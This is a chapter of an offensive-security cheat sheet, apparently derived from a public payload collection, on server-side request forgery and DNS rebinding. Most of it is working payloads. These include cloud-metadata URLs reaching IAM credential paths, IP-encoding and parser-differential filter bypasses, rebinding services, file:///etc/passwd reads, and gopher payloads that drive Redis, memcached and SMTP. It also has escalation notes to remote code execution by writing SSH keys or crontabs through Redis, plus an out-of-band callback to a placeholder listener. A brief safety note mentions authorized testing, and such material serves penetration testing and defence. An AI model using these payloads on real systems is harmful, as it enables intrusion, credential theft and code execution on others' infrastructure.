# Ch05 — Server-Side Request Forgery (SSRF) & DNS Rebinding

> Host-reachability payloads, localhost/metadata targets, filter-bypass families (encoding, parsing, redirect, DNS), URL-scheme smuggling, blind channels.
> Sources: `Server Side Request Forgery/`, `DNS Rebinding/`.

**Route here when**: the server fetches a URL/host you control the target of — image/webhook/url params, PDF generators, importers, link previewers, proxies.

**Safety**: probe internal hosts with benign paths (`/`, port connect, HEAD). Cloud metadata reads are the standard PoC — grab the *listing*, not live tokens. Never pivot to destructive internal actions.

## Target families

| Goal | Payload |
|---|---|
| Loopback | `http://127.0.0.1:80`, `http://localhost`, `http://0.0.0.0:80`, `http://[::]:80/` |
| IPv6 loopback | `http://[0000::1]:80/`, `http://[::ffff:127.0.0.1]` |
| Loopback CIDR | `http://127.127.127.127`, `http://127.0.1.3` (127.0.0.0/8 all loopback) |
| Shorthand | `http://0/`, `http://127.1`, `http://127.0.1` |
| Decimal IP | `http://2130706433/` = 127.0.0.1, `http://2852039166/` = 169.254.169.254 |
| Hex IP | `http://0x7f000001` = 127.0.0.1, `http://0xa9fea9fe` = 169.254.169.254 |
| Octal IP | `http://0177.0.0.1/`, `http://0o177.0.0.1/` |
| Internal net | `http://192.168.0.1`, `http://10.0.0.x`, `http://172.16.0.1` |

**Cloud metadata (the canonical PoC)**:

```ps1
http://169.254.169.254/latest/meta-data/                    # AWS
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/
http://metadata.google.internal/computeMetadata/v1/         # GCP (needs Metadata-Flavor: Google header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (needs Metadata: true header)
http://100.100.100.200/latest/meta-data/                    # Alibaba
```

Read the directory listing first; fetching `/iam/security-credentials/<role>` yields live keys — acceptable as proof-of-possession on authorized tests, don't persist them.

## Filter-bypass families

**DNS tricks** (domain resolves to internal IP):

```ps1
localtest.me          → resolves to ::1/127.0.0.1
localh.st             → 127.0.0.1
anything.127.0.0.1.nip.io   → nip.io: <any>.<IP>.nip.io maps to that IP
*.localhost           → reserved .localhost TLD → ::1
ip6-localhost, ip6-loopback → ::1 (IPv6 servers)
```

**URL encoding**:

```ps1
http://127.0.0.1/%61dmin          // 'a' encoded
http://127.0.0.1/%2561dmin        // double-encoded
http://%65xample.com              // host-encoded
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ          // enclosed-alphanumerics normalize to example.com
```

**Parser differentials** (Orange Tsai's `1.1.1.1 &@2.2.2.2# @3.3.3.3/` trick — each layer sees a different host):

```ps1
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
0://evil.com:80;http://allowed.com:80/      // PHP filter_var bypass
http://allowed.com@127.0.0.1/               // userinfo: validator sees allowed.com, fetcher hits 127.0.0.1
http://127.0.0.1#allowed.com                // fragment tricks
```

**Redirect bypass** — when the allowlist checks the *initial* URL only:

```ps1
https://307.r3dir.me/--to/?url=http://localhost          // public redirector → any URL
Your own 307/308 on an allowlisted host → internal target
```

307/308 preserve method+body; 301/302 switch to GET.

**DNS rebinding** — when the validator resolves the host at check-time but the fetcher re-resolves:

```ps1
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms   // alternates A-record between the two IPs (1u.ms service)
```

Or run your own: one name → first answer allowlisted IP, subsequent answers target IP. Classic for "fetch then check" and "check then fetch" TOCTOU gaps, and for browser-side rebinding to read internal hosts.

## Scheme smuggling

The fetcher's allowed schemes matter — test each:

```ps1
file:///etc/passwd                    // local file read
file://\/\/etc/passwd
dict://host:port/d:word:db:n          // DICT protocol — crude port/service probe
sftp://host:22/
tftp://host:69/PACKET                 // UDP!
ldap://localhost:11211/%0astats%0aquit  // CRLF inside ldap → memcached/service commands
gopher://localhost:25/_MAIL%20FROM:<a@b.c>%0D%0A   // raw TCP — SMTP, Redis, memcached
jar:http://127.0.0.1!/                // Java jar scheme (blind)
netdoc:///etc/passwd                  // Java: newline-safe file read
```

`gopher://` is the big one — URL-encode the whole protocol blob after `gopher://host:port/_`:

```ps1
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a        // Redis PING
gopher://127.0.0.1:11211/_stats%0d%0aquit%0d%0a             // memcached stats
gopher://127.0.0.1:25/_MAIL%20FROM:<x>%0D%0ARCPT%20TO:<y>%0D%0ADATA%0D%0A...
```

When gopher input can't contain newlines, encode them (`%0d%0a`) — most fetchers decode before opening the socket.

## Blind SSRF

No response body — use:

- **DNS/HTTP callback**: point the fetcher at your OOB listener (`?url=http://YOUR-CALLBACK/`). Any hit proves server-side fetch.
- **Timing**: open vs closed port response-time deltas → port scan.
- **Error differentials**: "connection refused" vs "timeout" vs response reflected in error message.
- **Blind chains**: known internal service URLs (assetnote/blind-ssrf-chains) — Elasticsearch `/_search`, Consul, Solr, Weblogic, Jira/Confluence endpoints, Redis/memcached via gopher.
- **Content-length/status oracles**: some apps return size or status of the fetched resource.

## Escalation notes

- SSRF→file read: `file://`/`netdoc://` schemes.
- SSRF→XSS: serve an SVG with JS from your URL when the fetched content renders in the app origin.
- SSRF→RCE: gopher to Redis (write SSH key/crontab via `CONFIG SET`/`SET`), memcached (write serialized payload), FastCGI/PHP-FPM (`gopher` to :9000 with crafted FCGI), Docker socket (`/var/run/docker.sock` via `http://` + `Host:` tricks).
- Header control: when you can inject headers into the server request (CRLF in URL, or app forwards headers), `Host:` + `X-Forwarded-*` unlock vhost-scoped internal apps.

## DNS rebinding as its own attack (browser)

Victim browser resolves `evil.tld` (low TTL) → attacker serves JS → DNS answer flips to `127.0.0.1`/internal IP → browser fetches internal service as same-origin. Needs: TTL≈0 authoritative DNS (services like 1u.ms / rebind.it or self-hosted), target service that answers on arbitrary Host headers, and a few minutes of dwell time.
